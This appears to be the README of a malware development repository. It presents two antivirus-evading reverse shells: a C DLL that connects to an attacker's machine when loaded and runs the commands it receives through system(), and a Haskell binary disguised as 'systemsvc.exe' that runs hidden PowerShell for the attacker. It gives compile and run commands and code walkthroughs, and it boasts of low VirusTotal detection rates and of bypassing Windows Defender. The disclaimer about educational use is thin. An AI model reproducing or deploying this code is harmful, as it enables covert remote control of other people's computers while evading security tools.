# MalDevLab

███╗   ███╗ █████╗ ██╗      ██████╗ ███████╗██╗   ██╗
████╗ ████║██╔══██╗██║     ██╔═══██╗██╔════╝╚██╗ ██╔╝
██╔████╔██║███████║██║     ██║   ██║███████╗ ╚████╔╝ 
██║╚██╔╝██║██╔══██║██║     ██║   ██║╚════██║  ╚██╔╝  
██║ ╚═╝ ██║██║  ██║███████╗╚██████╔╝███████║   ██║   
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   
       [ MalDevLab - Offensive Security]   


## Overview
This repository is dedicated to **advanced malware development and offensive security research**. The goal is to explore and document **stealthy malware techniques**, including **reverse shells, bypass mechanisms, DLL injection, and process injection methods**. 

---

## EvasionDLL - Stealthy DLL-based Reverse Shell
This is a DLL-based reverse shell that can evade detection by traditional antivirus solutions. The payload is delivered as a DLL that, once loaded into a running process, establishes a reverse connection to the attacker’s machine, providing remote command execution capabilities.

# Detection Status  
During testing, **Windows 10 and Windows 11 did not flag this DLL as malicious**, allowing it to execute without interference. Standard Windows Defender protections were **bypassed** in a default configuration.  
 
### VirusTotal Scan Results  
Additionally, when uploaded to **VirusTotal**, the file received **only 3 detections out of 72 antivirus engines**, indicating that many security solutions failed to recognize it as a threat. 
![VirusTotal Scan](/screenshots/vt-dll.png)

## How to Compile and Run

### **Compiling the C File to a DLL**  

To compile the provided C file (`reverse_shell.c`) into a DLL on a Linux system using **MinGW**, use the following command:  

```bash
x86_64-w64-mingw32-gcc -shared -o reverse_shell.dll reverse_shell.c -lws2_32
```

### Running the DLL on Windows

Once the DLL is compiled, you can run it on a Windows System using the following command:
```bash
rundll32.exe .\reverse_shell.dll reverse_shell
```
![Windows Execution](/screenshots/windows-dll-execution.png)

## Understanding the Code

### Winsock Initialization
```c
WSADATA wsa;
if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
    printf("WSAStartup failed with error: %d\n", WSAGetLastError());
    return;
}
```
- Initializes **Windows Sockets API (Winsock)** to enable network communication.
- If initialization fails, the function exits.

### Socket Creation
```c
sock = socket(AF_INET, SOCK_STREAM, 0);
if (sock == INVALID_SOCKET) {
    printf("Socket creation failed with error: %d\n", WSAGetLastError());
    WSACleanup();
    return;
}
```
- Creates a **TCP socket** for communication.
- If socket creation fails, the program terminates.

### Connecting to the Remote Server
```c
server.sin_family = AF_INET;
server.sin_port = htons(PORT);
server.sin_addr.s_addr = inet_addr(IP);

if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
    printf("Connection failed with error: %d\n", WSAGetLastError());
    closesocket(sock);
    WSACleanup();
    return;
}
```
- Specifies the **attacker-controlled server IP and port**.
- Attempts to establish a **reverse shell connection**.

### Command Execution Loop
```c
bytes_received = recv(sock, buffer, sizeof(buffer), 0);
if (bytes_received == SOCKET_ERROR) {
    printf("Recv failed with error: %d\n", WSAGetLastError());
    break;
}

buffer[bytes_received] = '\0';
system(buffer);  // Execute received commands

bytes_received = send(sock, buffer, bytes_received, 0);
```
- **Receives commands** from the attacker.
- Uses `system(buffer)` to **execute received commands**.
- Sends **command output back to the attacker**.

### DLL Execution Trigger
```c
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        reverse_shell(); // Execute the reverse shell when the DLL is loaded
    }
    return TRUE;
}
```
- When the DLL is **loaded into a process**, it **automatically** launches the reverse shell.
- This **abuses DLL hijacking or injection** to execute malware.
---

## Why This Code is Stealthy

This **DLL-based reverse shell** is designed to be **stealthy** and **difficult to detect** by traditional security solutions. The code employs a few key techniques that contribute to its evasion capabilities:

1. **No User Interaction**: The reverse shell is executed as a DLL, which can be loaded into a process without the user's explicit action. This makes it harder to detect since it doesn't require the typical user-triggered behaviors like running an executable file. By leveraging **DLL injection**, it can remain hidden in memory and avoid common detection methods targeting executables.

2. **Minimal Behavioral Footprint**: The code establishes a **TCP connection** to a remote server and executes system commands through the **`system()`** function. These actions are difficult to flag because the reverse shell itself doesn't exhibit any **suspicious file activity** or aggressive system changes. It only listens for commands and responds, mimicking legitimate network traffic.

3. **Bypassing Signature-Based Detection**: Many traditional **antivirus programs** rely on signature-based detection to flag known threats. However, this reverse shell is **custom-crafted** and doesn’t exhibit easily recognizable patterns that many security tools look for. Since the code is **not widely known**, signature-based antivirus engines have a harder time identifying it as malicious.

4. **Low Detection Rate on VirusTotal**: When uploaded to **VirusTotal**, this DLL was flagged by only **3 out of 73 antivirus engines**. This low detection rate is partly due to the **unique nature** of the code and its use of common system functions (like `system()`) that are often considered benign. Security solutions relying on heuristics or reputation-based detection may fail to flag it, especially when executed in controlled environments that don't exhibit obvious signs of exploitation.

These factors make this reverse shell **highly effective at evading detection** in environments where traditional security tools are used, highlighting the need for **advanced behavioral analysis** and **network monitoring** to detect malicious activity in real-time.

---

# systemsvc.exe - Haskell Reverse Shell - Stealthy PowerShell Execution

## Overview  
This is a **Haskell-based reverse shell** that establishes a connection to a remote server and executes PowerShell commands **stealthily**. Unlike traditional payloads, this implementation uses **Haskell’s process management and socket handling** to launch PowerShell in a **hidden mode**, making it difficult to detect.  

## Detection Status  
- **0/73 detections on VirusTotal** – No antivirus engines flagged the compiled binary as malicious.  
- Uses **Haskell runtime** to execute a reverse shell in a way that **minimizes heuristic-based detection**.  

### VirusTotal Scan Results  
![Windows Execution](/screenshots/vt-haskell.png)


## Why This Code is Stealthy  

**Fileless Execution Possible** – Can be compiled as a **memory-only payload**.  
**Minimal Behavioral Footprint** – Runs PowerShell without spawning visible processes.  
**No Antivirus Detections (0/73)** – Not flagged by VirusTotal.  

---

## Compiling and Running the Haskell Reverse Shell  

On **Windows**, use:  
```powershell
ghc --make systemsvc.hs -o systemsvc.exe -package process -package base
```
![Compiling](/screenshots/windows-haskell-compilation.png)


### Executing the Reverse Shell on Windows  
Once compiled, the executable can be run directly:  
```powershell
.\systemsvc.exe
```
## Msfconsole example
![Msfconsole handler](/screenshots/haskell-msfconsole1.png)
![Msfconsole powershell_to_meterpreter](/screenshots/haskell-msfconsole2.png)

## Code Walkthrough  

### Socket Initialization & Connection  
```haskell
addrInfo <- getAddrInfo Nothing (Just remoteHost) (Just remotePort)
let serverAddr = case addrInfo of
        (ai:_) -> addrAddress ai
        []     -> error "Could not resolve address"

sock <- socket AF_INET Stream defaultProtocol
connect sock serverAddr
```
- Resolves the attacker's IP address and port.  
- Establishes a **TCP connection** to the attacker's machine.  

### Hiding PowerShell Execution  
```haskell
let createProcessSpec = (proc "powershell.exe" ["-NoProfile", "-WindowStyle", "Hidden"])
      { std_in  = CreatePipe
      , std_out = CreatePipe
      , std_err = CreatePipe
      , create_group = True
      , new_session = True
      , close_fds = True
      }
```
- **Launches PowerShell in hidden mode**, preventing any visible windows from appearing.  
- **Disables profiles** (`-NoProfile`) to avoid detection by monitoring tools.  

### Command Execution Loop  
```haskell
let forwardOutput h = forever $ do
    result <- try (hGetLine h) :: IO (Either IOException String)
    case result of
        Left _  -> return ()
        Right line -> do
            hPutStrLn handle line
            hFlush handle

forkIO $ forwardOutput hout
forkIO $ forwardOutput herr

forever $ do
    cmd <- hGetLine handle
    hPutStrLn hin cmd
    hFlush hin
```
- **Reads commands from the attacker's machine** and executes them in PowerShell.  
- **Forwards output back** to the attacker's Netcat listener.  
- **Runs PowerShell output redirection in separate threads**, ensuring smooth communication.  

---

**Disclaimer:** This repository is for educational purposes only. But make sure you have **fun**.  
